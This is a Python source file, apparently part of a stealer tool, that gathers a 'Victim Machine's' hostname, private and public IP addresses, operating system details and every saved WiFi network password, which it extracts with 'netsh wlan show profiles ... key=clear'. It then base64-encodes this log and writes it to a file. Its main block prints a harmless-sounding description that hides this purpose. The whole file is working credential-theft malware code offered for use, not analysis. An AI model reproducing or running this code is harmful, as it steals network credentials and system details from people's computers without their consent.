import socket
import subprocess
import platform
import re
import base64
from requests import get


def fetch_info(path):
    with open(path, 'w') as f:
        # Logging basic system info 
        log = ''
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        log += "Victim Machine's Information: \n"
        log += "HostName: "+hostname+'\n'
        log += "Private IP: "+IPaddr+'\n'

        try:
            public_IP = get('https://api.ipify.org').text
            log += "Public IP: "+public_IP+"\n"
        except Exception:
            log += "Failed to read Public IP\n"

        log += "System: "+platform.system()+" "+platform.version()+"\n"
        log += "Processor: "+platform.processor()+"\n"
        log += "Machine: "+platform.machine()+"\n\n"
        log += "WiFi Information: "

        # Logging Information about saved WiFi in system 
        try:
            command = 'netsh wlan show profiles | find "All User Profile"'
            networks = subprocess.run(
                command, capture_output=True, text=True, shell=True)
            network_names = re.findall(
                pattern="(?:Profile\s*:\s)(.*)", string=networks.stdout)

            for net in network_names:
                try:
                    command = 'netsh wlan show profiles name= "' + net + '" key=clear'
                    key = subprocess.run(
                        command, capture_output=True, text=True, shell=True)
                    out_key = re.search(
                        pattern="(?:Key Content\s*:\s)(.*)", string=key.stdout)
                    log += "\nWiFi ID = "+net+" | Password = "+out_key.group(1)
                except Exception:
                    log+=f'\nError extracting info for [{net}]'

        except Exception:
            log += "\nWiFi Info not available"

        log += '\n\n\n'
        log = base64.b64encode(log.encode()).decode()
        f.write(log)
        f.close()


if __name__ == '__main__':
    print("Used for getting system information")
